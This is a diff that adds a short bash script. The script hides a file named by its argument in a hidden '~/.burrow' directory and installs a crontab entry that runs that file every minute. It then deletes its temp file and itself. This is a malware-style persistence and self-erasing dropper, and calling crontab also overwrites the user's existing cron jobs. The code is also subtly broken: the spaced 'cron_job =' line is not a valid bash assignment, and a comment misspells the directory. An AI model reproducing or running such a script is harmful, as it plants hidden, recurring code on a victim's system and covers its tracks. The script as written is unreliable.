@@ -1,0 +1,32 @@
+
+#!/bin/bash
+echo "$# positional parameters detected!"
+
+if [ ! "$#" -eq 1 ]; then
+	echo "Usage: $0 j3rry"
+	exit 0
+fi
+
+# create .borrow
+# move jerry to .burrow
+# edit crontabs
+# self terminate
+
+burrow="/home/$USER/.burrow"
+echo "Creating burrow directory: $burrow"
+mkdir "$burrow"
+
+echo "Moving $1 to $burrow"
+mv "$1" "$burrow"
+
+
+cron_job = "* * * * * $burrow/$1"
+
+echo "$cron_job" > "/tmp/$1"
+echo "adding j3rry to crontabs"
+crontab "/tmp/$1"
+
+echo "Self terminating."
+rm "/tmp/$1"
+rm -- "$0"
+exit 0
